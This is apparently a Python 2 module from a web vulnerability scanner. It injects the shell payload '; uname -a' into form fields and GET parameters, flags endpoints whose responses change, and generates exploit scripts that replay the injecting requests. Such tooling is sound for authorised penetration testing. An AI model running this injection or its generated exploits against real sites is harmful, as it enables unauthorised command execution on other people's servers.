import httplib2
import urllib
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, post_request, create_post_params, create_get_params, log_results, has_get_params, get_request
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "sci"
EXPLOIT_CLASS = "Command Injection"


class SCIModule:
    """
    Shell Command Injection Module
    Checks for Command Injection vulnerability
    """

    def __init__(self, url, web_pages):
        self.url = url
        self.web_pages = web_pages
        self.logs = {}

    def generate_exploits(self):
        counter = 0
        for target in self.logs["results"]:
            for vuln in self.logs["results"][target]:
                fp = open(EXPLOIT_PATH + EXPLOIT_TYPE + str(counter) + ".py", "w")
                fp.write("import urllib, urllib2, cookielib, webbrowser, os\n")
                endpoint = target + vuln["endpoint"]
                if vuln["method"] == "POST":
                   fp.write('url = "'+endpoint+'"\n')
                   fp.write('values = '+str(vuln["params"])+'\n')
                   fp.write('data = urllib.urlencode(values)\n')
                   fp.write('req = urllib2.Request(url, data)\n')
                   fp.write('rsp = urllib2.urlopen(req)\n')
                   fp.write('content = rsp.read()\n')
                   fp.write('tmp_file = "/tmp/tmp.html"\n')
                   fp.write('fp = open(tmp_file, "w")\n')
                   fp.write('fp.write(content)\n')
                   fp.write('fp.close()\n')
                   fp.write('webbrowser.open("file://" + os.path.realpath(tmp_file))\n')
                # elif vuln["method"] == "GET":
                    # TODO: Finish this part
                fp.close()
                counter += 1

    def scan(self):
        results = []
        get_param_pages = Set([])
        for web_page in self.web_pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            if has_form(response):
                forms = parse_form(response)
                original_response = post_request(web_page, forms)
                injection_forms = []
                for form_input in forms:
                    if form_input[0] == "csrftoken": # We don't have incentive to change this
                        injection_forms.append(form_input)
                    else:
                        injection_forms.append((form_input[0], "; uname -a"))
                new_response = post_request(web_page, injection_forms)
                if original_response != new_response: # That means that the webpage is different, possibly a successful case
                    results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
            elif has_get_params(web_page) and urlparse(web_page).path not in get_param_pages:
                parsed_web_page = urlparse(web_page)
                get_param_pages.add(parsed_web_page.path)
                param_list = map(lambda x: x.split("="), parsed_web_page.query.split("&"))
                original_response = get_request(web_page)
                random_param_query = "?" + "&".join(map(lambda param: param[0] + "=" + urllib.quote("slkdfjsldk") ,param_list))
                random_url = parsed_web_page.scheme + "://" + parsed_web_page.netloc + parsed_web_page.path + random_param_query
                random_response = get_request(random_url)
                malicious_params = []
                malicious_params = []
                for param in param_list:
                    malicious_params.append((param[0], "; uname -a"))
                malicious_param_query = "?" + "&".join(map(lambda malicious_param: malicious_param[0] + "=" + urllib.quote(malicious_param[1]), malicious_params))
                malicious_url = parsed_web_page.scheme  + "://" + parsed_web_page.netloc + parsed_web_page.path + malicious_param_query
                malicious_response = get_request(malicious_url)
                if malicious_response != original_response and malicious_response != random_response: # That means that the webpage is different, possibly a successful case
                    results.append((urlparse(web_page).path, create_get_params(malicious_url), "GET"))
        self.logs = log_results(self.url, results, EXPLOIT_CLASS)
